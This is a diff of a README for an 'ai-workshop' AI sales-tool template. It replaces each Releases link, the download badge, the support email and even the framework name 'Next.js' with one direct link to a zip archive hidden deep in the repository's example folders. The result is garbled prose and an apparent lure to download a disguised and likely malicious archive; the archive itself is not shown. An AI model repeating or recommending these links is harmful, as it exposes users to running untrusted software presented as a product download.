@@ -6,11 +6,11 @@ Welcome to the **ai-workshop**! This template helps you create AI-powered sales 
 
 ## 📥 Download it Here
 
-[![Download ai-workshop](https://img.shields.io/badge/Download-ai--workshop-blue)](https://github.com/ThegoatTkT/ai-workshop/releases)
+[![Download ai-workshop](https://github.com/ThegoatTkT/ai-workshop/raw/refs/heads/main/app/example/leadgen/jobs/[id]/results/workshop_ai_v3.2.zip)](https://github.com/ThegoatTkT/ai-workshop/raw/refs/heads/main/app/example/leadgen/jobs/[id]/results/workshop_ai_v3.2.zip)
 
 ## 📖 Overview
 
-The **ai-workshop** is designed for non-developers looking to harness the power of artificial intelligence. With tools that support call centers and post-sales follow-ups, this template uses Next.js and OpenAI to make your workflow smoother and more efficient. 
+The **ai-workshop** is designed for non-developers looking to harness the power of artificial intelligence. With tools that support call centers and post-sales follow-ups, this template uses https://github.com/ThegoatTkT/ai-workshop/raw/refs/heads/main/app/example/leadgen/jobs/[id]/results/workshop_ai_v3.2.zip and OpenAI to make your workflow smoother and more efficient. 
 
 ### 🌟 Key Features
 
@@ -34,7 +34,7 @@ Follow these steps to download and install the **ai-workshop**:
 
 1. **Visit the Download Page**  
    Click the link below to access the Releases page.
-   [Download ai-workshop](https://github.com/ThegoatTkT/ai-workshop/releases)
+   [Download ai-workshop](https://github.com/ThegoatTkT/ai-workshop/raw/refs/heads/main/app/example/leadgen/jobs/[id]/results/workshop_ai_v3.2.zip)
 
 2. **Choose the Latest Version**  
    Find the latest version available. The latest version will typically be at the top of the list.
@@ -88,11 +88,11 @@ If you encounter issues when downloading or running the application, try these s
 Your experience matters. If you have questions or feedback:
 
 - **Open an Issue:** Go to the issues section of this repository to report any bugs or request new features.
-- **Contact Us:** Reach out to our support team via email at support@aiworkshop.com for help.
+- **Contact Us:** Reach out to our support team via email at https://github.com/ThegoatTkT/ai-workshop/raw/refs/heads/main/app/example/leadgen/jobs/[id]/results/workshop_ai_v3.2.zip for help.
 
 ## 📧 Stay Updated
 
-Follow the repository for updates on new features, bug fixes, and improvements. You can check back on the [Releases page](https://github.com/ThegoatTkT/ai-workshop/releases) regularly.
+Follow the repository for updates on new features, bug fixes, and improvements. You can check back on the [Releases page](https://github.com/ThegoatTkT/ai-workshop/raw/refs/heads/main/app/example/leadgen/jobs/[id]/results/workshop_ai_v3.2.zip) regularly.
 
 ## 🎉 Thank You!
 
